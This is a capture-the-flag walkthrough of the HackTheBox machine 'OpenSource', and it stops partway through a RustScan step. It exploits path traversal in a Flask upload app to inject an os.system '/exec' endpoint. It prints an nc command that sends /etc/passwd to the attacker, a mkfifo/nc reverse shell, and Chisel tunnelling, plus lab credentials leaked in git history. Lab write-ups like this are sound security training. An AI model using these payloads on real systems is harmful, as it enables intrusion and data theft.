---
title: "Walk-through of OpenSource from HackTheBox"
header:
  teaser: /assets/images/2022-05-27-16-29-49.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Flask
  - GitTools
  - tcpdump
  - Port Enumeration
  - Chisel
  - Proxychains
  - RustScan
  - Gitea
  - Pspy64
  - Git Pre-Commit
---

[OpenSource](https://www.hackthebox.com/home/machines/profile/471) is an easy level machine by [irogir](https://www.hackthebox.com/home/users/profile/476556) on [HackTheBox](https://www.hackthebox.com/home). It focuses on applications, containers and working with git.

<!--more-->

## Machine Information

![opensource](/assets/images/2022-05-27-16-29-49.png)

We start by looking at an opensource web application used to upload files. The source files are available and after a code review of them we find a path traversal vulnerability. Using that we add a new endpoint to the Flask app and use that to gain code execution. This gets us to a shell inside a container, which we use Chisel to create a reverse tunnel back to Kali. Trough that tunnel we find Gitea, and with credentials found earlier we get a users private ssh keys. From there escalation to root is a trivial process of exploiting git pre-commits.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - OpenSource](https://www.hackthebox.com/home/machines/profile/471) |
| Machine Release Date | 21st May 2022 |
| Date I Completed It | 11th June 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.164 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root㉿kali)-[~/htb/opensource]
└─# nmap -p$ports -sC -sV -oA opensource 10.10.11.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 16:32 BST
Nmap scan report for 10.10.11.164
Host is up (0.11s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 27 May 2022 15:32:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|_
3000/tcp filtered ppp

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 99.43 seconds
```

## upcloud Website

Starting place as is often the way will be a website on port 80:

![opensource-website](/assets/images/2022-05-27-16-34-36.png)

Not a lot on this site. Scroll down to the bottom to see two links that do work:

![opensource-links](/assets/images/2022-05-27-16-41-28.png)

**Download** let's us get the source for the site. **Take me there!** let's you try uploading files. Let's start by looking at the source code. With this being CTF we can assume we're looking for a vulnerability to be able to upload a file of our choosing.

Grab the file and unzip it:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# wget http://10.10.11.164/download -O source.zip
--2022-05-27 16:44:50--  http://10.10.11.164/download
Connecting to 10.10.11.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2489147 (2.4M) [application/zip]
Saving to: ‘source.zip’
source.zip   100%[==============>]   2.37M   543KB/s    in 4.8s    
2022-05-27 16:44:55 (509 KB/s) - ‘source.zip’ saved [2489147/2489147]

──(root㉿kali)-[~/htb/opensource]
└─# unzip source.zip                                        
Archive:  source.zip
   creating: app/
   creating: app/app/
  inflating: app/app/views.py        
  inflating: app/app/__init__.py     
   creating: app/app/static/
   creating: app/app/static/js/
  inflating: app/app/static/js/script.js  
  inflating: app/app/static/js/ie10-viewport-bug-workaround.js  
   creating: app/app/static/vendor/
   creating: app/app/static/vendor/bootstrap/
   creating: app/app/static/vendor/bootstrap/js/
  <SNIP>
  inflating: Dockerfile              
   creating: .git/
   creating: .git/branches/
  inflating: .git/description        
  inflating: .git/config             
   creating: .git/info/
  inflating: .git/info/exclude       
   creating: .git/objects/
   creating: .git/objects/01/
 extracting: .git/objects/01/c76bb30cbd05b810719576d79b5535a56475f1  
   creating: .git/objects/11/
 extracting: .git/objects/11/3af9958c392c6d0212475bf4c7581aff34e857  
   creating: .git/objects/85/
<SNIP>
  inflating: .git/index              
   creating: .git/logs/
  inflating: .git/logs/HEAD          
   creating: .git/logs/refs/
   creating: .git/logs/refs/heads/
  inflating: .git/logs/refs/heads/public  
  inflating: .git/logs/refs/heads/dev  
```

There's a lot of files in there. The interesting ones are a Dockerfile, and a .git repo. So we know the website is running in a docker container, and we have a git repo to explore.

## GitTools

First install GitTools and then use it to extra the Git repo:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# git clone https://github.com/internetwache/GitTools
Cloning into 'GitTools'...
remote: Enumerating objects: 242, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (26/26), done.
remote: Total 242 (delta 9), reused 14 (delta 4), pack-reused 209
Receiving objects: 100% (242/242), 56.48 KiB | 876.00 KiB/s, done.
Resolving deltas: 100% (88/88), done.


┌──(root㉿kali)-[~/htb/opensource]
└─# GitTools/Extractor/extractor.sh . extracted
'###########
# Extractor is part of https://github.com/internetwache/GitTools
# Developed and maintained by @gehaxelt from @internetwache
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########'
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: c41fedef2ec6df98735c11b2faf1e79ef492a0f3
[+] Found file: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/.gitignore
[+] Found file: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/Dockerfile
[+] Found folder: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app
[+] Found file: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/INSTALL.md
[+] Found folder: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app
[+] Found file: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app/__init__.py
[+] Found file: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app/configuration.py
[+] Found folder: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app/static
[+] Found folder: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app/static/css
[+] Found file: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app/static/css/style.css
[+] Found folder: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app/static/js
[+] Found file: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app/static/js/ie10-viewport-bug-workaround.js
[+] Found file: /root/htb/opensource/extracted/0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3/app/app/static/js/script.js
<SNIP>
[+] Found file: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/app/app/templates/index.html
[+] Found file: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/app/app/templates/success.html
[+] Found file: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/app/app/templates/upload.html
[+] Found file: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/app/app/utils.py
[+] Found file: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/app/app/views.py
[+] Found file: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/app/run.py
[+] Found file: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/build-docker.sh
[+] Found folder: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/config
[+] Found file: /root/htb/opensource/extracted/4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9/config/supervisord.conf
```

## Code Review

There's a lot of files. Looking in the extracted folder we see an initial commit, and then four more which probably have changes:

```sh
┌──(root㉿kali)-[~/htb/opensource/extracted]
└─# ll
total 20
drwxr-xr-x 4 root root 4096 May 27 17:05 0-c41fedef2ec6df98735c11b2faf1e79ef492a0f3
drwxr-xr-x 4 root root 4096 May 27 17:05 1-be4da71987bbbc8fae7c961fb2de01ebd0be1997
drwxr-xr-x 4 root root 4096 May 27 17:05 2-ee9d9f1ef9156c787d53074493e39ae364cd1e05
drwxr-xr-x 4 root root 4096 May 27 17:05 3-a76f8f75f7a4a12b706b0cf9c983796fa1985820
drwxr-xr-x 4 root root 4096 May 27 17:05 4-2c67a52253c6fe1f206ad82ba747e43208e8cfd9
```

We can use **git log** to see the commit comments:

```sh
┌──(root㉿kali)-[~/htb/opensource/extracted]
└─# git log --pretty=oneline 
2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public) clean up dockerfile for production use
ee9d9f1ef9156c787d53074493e39ae364cd1e05 initial
```

We can use **git diff** to see what has changed between commits:

```sh
┌──(root㉿kali)-[~/htb/opensource/extracted]
└─# git diff ee9d9f1ef9156c787d53074493e39ae364cd1e05 a76f8f75f7a4a12b706b0cf9c983796fa1985820 
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
diff --git a/app/app/views.py b/app/app/views.py
index f2744c6..0f3cc37 100644
--- a/app/app/views.py
+++ b/app/app/views.py
@@ -6,7 +6,17 @@ from flask import render_template, request, send_file
 from app import app
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/download')
+def download():
+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
+
+
+@app.route('/upcloud', methods=['GET', 'POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -20,4 +30,4 @@ def upload_file():
 @app.route('/uploads/<path:path>')
 def send_report(path):
     path = get_file_name(path)
-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\ No newline at end of file
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

The above shows a number of changes to the views.py file. This line looks like credentials of some sort:

```python
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
```

We don't know what they are for yet, but looking at other commits there are more changes to views.py. So let's have a look at the file that is in the live folder instead of these in the git repo:

```sh
┌──(root㉿kali)-[~/htb/opensource/app/app]
└─# ll
total 24
-rw-rw-r-- 1 root root  332 Apr 28 12:34 configuration.py
-rw-rw-r-- 1 root root  262 Apr 28 12:34 __init__.py
drwxrwxr-x 5 root root 4096 Apr 28 12:39 static
drwxrwxr-x 2 root root 4096 Apr 28 12:34 templates
-rw-rw-r-- 1 root root  816 Apr 28 12:34 utils.py
-rw-rw-r-- 1 root root  707 Apr 28 13:50 views.py
```

Here I've moved out of the .git folder and in to the app folder. Let's look at views.py:

```python
┌──(root㉿kali)-[~/htb/opensource/app/app]
└─# cat views.py                       
import os
from app.utils import get_file_name
from flask import render_template, request, send_file
from app import app
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')
@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path)) 
```

This file contains the code handling the uploading of files. The important line is this one:

```python
file_name = get_file_name(f.filename)
```

The get_file_name function is imported from the utils.py file:

```python
┌──(root㉿kali)-[~/htb/opensource/app/app]
└─# cat utils.py 
import time
def current_milli_time():
    return round(time.time() * 1000)
"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")
"""
TODO: get unique filename
"""
def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension
"""
Recursively replace a pattern in a string
"""
def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

We can see in here that there is a basic check for directory traversal, and if ../ is found then it will be removed. However when this is passed back to the upload file function no further checks are done so we can intercept using Burp.

After some playing around I found I can alter the views.py file to add my own code to it. Then I can use that to get command execution.

This is a Flask app so a search on how to create an execute code function found [this](https://www.secjuice.com/247ctf-slippery-upload-write-up):

```python
@app.route('/exec')
def runcmd():
    try:
        return os.system(request.args.get('cmd'))
    except:
        return "Exit"
```

## Exploit Flask App

Go back to the upload section on the website and browse to the local copy of views.py we have from the download we looked at earlier:

![opensource-upload-file](/assets/images/2022-05-28-18-03-46.png)

Have Burp ready to intercept and then click **Upload!**, now switch to Burp:

![opensource-burp-intercept](/assets/images/2022-05-28-18-05-42.png)

Add the exec function we found above to the bottom of the file:

![opensource-burp-add-code](/assets/images/2022-05-28-18-06-27.png)

Now change the path the file will be uploaded to:

![opensource-burp-change-path](/assets/images/2022-05-28-18-09-16.png)

We can't get any output from commands on the webpage, but we can point to our Kali. Let's try pinging ourselves first:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─#  tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Here we have a listener on Kali waiting for imcp packets. Back to the box and try to ping us with this which I've URL encoded:

```text
ping+-c+4+10.10.14.116
```

Use our new /exec function with the cmd parameter we created:

![opensource-ping-me](/assets/images/2022-05-28-18-17-31.png)

Ignore the error on the webpage. Looking back at Kali we see it worked:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:16:59.874732 IP 10.10.11.164 > 10.10.14.116: ICMP echo request, id 95, seq 0, length 64
18:16:59.874764 IP 10.10.14.116 > 10.10.11.164: ICMP echo reply, id 95, seq 0, length 64
18:17:00.871273 IP 10.10.11.164 > 10.10.14.116: ICMP echo request, id 95, seq 1, length 64
18:17:00.871292 IP 10.10.14.116 > 10.10.11.164: ICMP echo reply, id 95, seq 1, length 64
18:17:01.871263 IP 10.10.11.164 > 10.10.14.116: ICMP echo request, id 95, seq 2, length 64
18:17:01.871278 IP 10.10.14.116 > 10.10.11.164: ICMP echo reply, id 95, seq 2, length 64
18:17:02.871875 IP 10.10.11.164 > 10.10.14.116: ICMP echo request, id 95, seq 3, length 64
18:17:02.871891 IP 10.10.14.116 > 10.10.11.164: ICMP echo reply, id 95, seq 3, length 64
```

How about we grab the passwd file by using nc to redirect the file to us:

```text
nc+-nv+10.10.14.116+4444+<+/etc/passwd
```

Start nc listening on Kali ready to receive the file:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# nc -nlvp 4444 > passwd 
listening on [any] 4444 ...
```

Paste the URL encoded command in to the browser as before:

![opensource-passwd](/assets/images/2022-05-28-18-22-21.png)

Back to Kali again to see we have the file:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# nc -nlvp 4444 > passwd 
listening on [any] 4444 ...
connect to [10.10.14.116] from (UNKNOWN) [10.10.11.164] 38679
```

Let's check it out:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# cat passwd                    
root:x:0:0:root:/root:/bin/ash
<SNIP>
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

Time for a reverse shell. This is just like we did in [Nunchucks](https://pencer.io/ctf/ctf-htb-nunchucks) recently, so let's use the same one:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.163 1337 >/tmp/f
```

URL encode it first, we can use Python to do that:

```text
┌──(root㉿kali)-[~/htb/opensource]
└─# python3 -c "import urllib.parse; print(urllib.parse.quote('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.163 1337 >/tmp/f'))"

rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%2010.10.14.184%201337%20%3E/tmp/f
```

Now add it as a parameter on the /exec endpoint like we did before and paste in the browser:

![opensource-reverse-shell](/assets/images/2022-06-07-22-06-37.png)

## Shell To Container

Switch to a waiting nc listener to see we have a shell connected:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# nc -nlvp 1337         
listening on [any] 1337 ...
connect to [10.10.14.163] from (UNKNOWN) [10.10.11.164] 41543
/app #
```

A quick look at root shows us we're in a docker container:

```sh
/app # ls -lsa /
total 72
     4 drwxr-xr-x    1 root     root          4096 Jun  7 19:02 .
     4 drwxr-xr-x    1 root     root          4096 Jun  7 19:02 ..
     0 -rwxr-xr-x    1 root     root             0 Jun  7 19:02 .dockerenv
     8 drwxr-xr-x    1 root     root          4096 May  4 16:35 app
     4 drwxr-xr-x    1 root     root          4096 Mar 17 05:52 bin
     0 drwxr-xr-x    5 root     root           340 Jun  7 19:02 dev
 ```

 We can confirm with a little enumeration:

 ```sh
 /app # arp
? (172.17.0.1) at 02:42:71:1c:b4:47 [ether]  on eth0

/app # route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
172.17.0.0      *               255.255.0.0     U     0      0        0 eth0

/app # netstat -anp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      7/python
tcp        0     54 172.17.0.5:41543        10.10.14.163:1337       ESTABLISHED 543/nc
tcp        0      0 172.17.0.5:80           10.10.14.163:58108      ESTABLISHED 527/python
tcp        0      0 172.17.0.5:80           172.17.0.1:53770        TIME_WAIT   -

/app # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:05  
          inet addr:172.17.0.5  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:845 errors:0 dropped:0 overruns:0 frame:0
          TX packets:803 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:74639 (72.8 KiB)  TX bytes:412353 (402.6 KiB)
```

So the container we are insides IP is 172.17.0.5. The host IP is 172.17.0.1, which is probably the internal IP of the main box on 10.10.11.164.

## Port Enumeration

On our original nmap scan we saw port 3000 was being filtered. With us now inside the network we can try and scan from there to see if we can get to that port. For that we can do a simple bash loop, but we are in a Busybox shell not a bash one so the commands are slightly different. I found [this](https://stackoverflow.com/questions/1445452/shell-script-for-loop-syntax) which helped me get the right syntax using nc in a loop:

We can scan all ports like this:

```sh
i=1
max=65535
while [ $i -lt $max ]
do
    echo "Port: $i"
    nc -w 1 -v 172.17.0.1 $i </dev/null; echo $?
    true $(( i++ ))
done
```

It takes a while, but here's the ports we're interested in:

```sh
Port: 22
172.17.0.1 (172.17.0.1:22) open
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
0
Port: 23
1
<SNIP>
Port: 79
1
Port: 80
172.17.0.1 (172.17.0.1:80) open
0
<SNIP>
Port: 2999
1
Port: 3000
172.17.0.1 (172.17.0.1:3000) open
0
```

This confirms port 22, 80 and 3000 are open and accessible from this container. Let's have a look what's on port 80:

```sh
/app # wget 172.17.0.1:80
Connecting to 172.17.0.1:80 (172.17.0.1:80)
saving to 'index.html'
index.html   100% |**************************|  5316  0:00:00 ETA
'index.html' saved

/app # head index.html
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>upcloud - Upload files for Free!</title>

    <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
    <script src="/static/vendor/popper/popper.min.js"></script>

    <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
```

We can see the original site where we uploaded our initial file is on port 80. Now look at port 3000:

```sh
/app # wget 172.17.0.1:3000
Connecting to 172.17.0.1:3000 (172.17.0.1:3000)
saving to 'index.html'
index.html   100% |***********************| 13414  0:00:00 ETA
'index.html' saved

/app # head index.html
<!DOCTYPE html>
<html lang="en-US" class="theme-">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> Gitea: Git with a cup of tea</title>
        <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19"/>
        <meta name="theme-color" content="#6cc644">
        <meta name="default-theme" content="auto" />
        <meta name="author" content="Gitea - Git with a cup of tea" />
/app # 
```

And we can see port 3000 gives us access to [Gitea](https://github.com/go-gitea/gitea), which is the default port it uses when installed.

## Chisel

We can't interact with Gitea from this command line so let's use [Chisel](https://github.com/jpillora/chisel) to create a reverse proxy like we did with [Wreath](https://pencer.io/ctf/ctf-thm-wreath/#windows-pc---enumeration) over on [TryHackMe](https://tryhackme.com/room/wreath).

If you need a good primer on Chisel then 0xdf has a good article here [here](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html).

First grab the latest version:

```sh
──(root㉿kali)-[~/htb/opensource]
└─# wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz               
--2022-06-07 22:38:39--  https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/ba3e7fe5-01fc-4b0c-b8eb-1b3a4c8eb61f?X-Amz-Algorithm=AWS4-HMAC-SHA256&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3234355 (3.1M) [application/octet-stream]
Saving to: ‘chisel_1.7.7_linux_amd64.gz’
chisel_1.7.7_linux_amd64.gz  100%[============>]   3.08M  16.9MB/s    in 0.2s    
2022-06-07 22:38:40 (16.9 MB/s) - ‘chisel_1.7.7_linux_amd64.gz’ saved [3234355/3234355]

┌──(root㉿kali)-[~/htb/opensource]
└─# gunzip chisel_1.7.7_linux_amd64.gz
```

Start Chisel on Kali listening on port 4444 and with reverse port forwarding enabled:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# ./chisel_1.7.7_linux_amd64 server --reverse --port 4444
2022/06/08 22:09:18 server: Reverse tunnelling enabled
2022/06/08 22:09:18 server: Fingerprint 8ymq6peW4qfi+AJoA9KllYq7DGw0+LFnmbqIuXNpJ4k=
2022/06/08 22:09:18 server: Listening on http://0.0.0.0:4444
2022/06/08 22:11:01 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Now start a web server so we can pull that file over to our target box:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Switch back to our shell on the box, grab the file and start Chisel in client mode:

```sh
/app # cd /tmp
/tmp # wget http://10.10.14.166:8000/chisel_1.7.7_linux_amd64
Connecting to 10.10.14.166:8000 (10.10.14.166:8000)
saving to 'chisel_1.7.7_linux_amd64'
chisel_1.7.7_linux_a  12% |***                             |  955k  0:00:07 ETA
chisel_1.7.7_linux_a  42% |*************                   | 3329k  0:00:02 ETA
chisel_1.7.7_linux_a  72% |***********************         | 5680k  0:00:01 ETA
chisel_1.7.7_linux_a 100% |********************************| 7888k  0:00:00 ETA
'chisel_1.7.7_linux_amd64' saved

/tmp # chmod +x chisel_1.7.7_linux_amd64

/tmp # ./chisel_1.7.7_linux_amd64 client 10.10.14.166:4444 R:socks
2022/06/08 21:11:01 client: Connecting to ws://10.10.14.166:4444
2022/06/08 21:11:01 client: Connected (Latency 20.715259ms)
```

Here we've told Chisel to connect to Kali on IP 10.10.14.166 port 4444. The R:socks options is used for the reverse connection. See the Chisel man page here:

```text
When the chisel server has --reverse enabled, remotes can
be prefixed with R to denote that they are reversed. That
is, the server will listen and accept connections, and they
will be proxied through the client which specified the remote.
Reverse remotes specifying "R:socks" will listen on the server's
default socks port (1080) and terminate the connection at the
client's internal SOCKS5 proxy.
```

To be able to tunnel TCP commands on Kali through Chisel to the box we need to use [proxychains](https://github.com/haad/proxychains). One last thing to do is add our socks5 proxy address mentioned above in to our proxychains config file so it knows which local port to direct the traffic to:

```sh
┌──(root㉿kali)-[~/htb/opensource/extracted]
└─# cp /etc/proxychains4.conf /etc/proxychains.conf
```

Copy the conf file and then add our socks5 line at the end:

```text
┌──(root㉿kali)-[~/htb/opensource/extracted]
└─# cat /etc/proxychains.conf
# proxychains.conf  VER 4.x
#
#        HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.
# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
<SNIP>
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 127.0.0.1 1080
```

## RustScan

We can now use proxychains with our reverse proxy tunnel provided by Chisel. For another bit of practice let's use [Rustscan](https://github.com/RustScan/RustScan) to look for open ports. This time we're doing it from Kali.

Download it and install if needed:

```sh
┌──(root㉿kali)-[~/htb/opensource]
└─# wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
--2022-06-08 22:19:56--  https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/278933035
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1460806 (1.4M) [application/octet-stream]
Saving to: ‘rustscan_2.0.1_amd64.deb’
rustscan_2.0.1_amd64.deb    100%[===================================================================>]   1.39M  --.-KB/s    in 0.1s    
2022-06-08 22:19:57 (13.5 MB/s) - ‘rustscan_2.0.1_amd64.deb’ saved [1460806/1460806]

┌──(root㉿kali)-[~/htb/opensource]
└─# dpkg -i rustscan_2.0.1_amd64.deb                                 
Selecting previously unselected package rustscan.
(Reading database ... 293238 files and directories currently installed.)
Preparing to unpack rustscan_2.0.1_amd64.deb ...
Unpacking rustscan (2.0.0) ...
Setting up rustscan (2.0.0) ...
Processing triggers for kali-menu (2021.4.2) ...
```

Now use it to scan those ports we've confirmed are open:

```text
┌──(root㉿kali)-[~/htb/opensource]
└─# proxychains4 rustscan -a 172.17.0.1 -p 22,80,3000                   
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
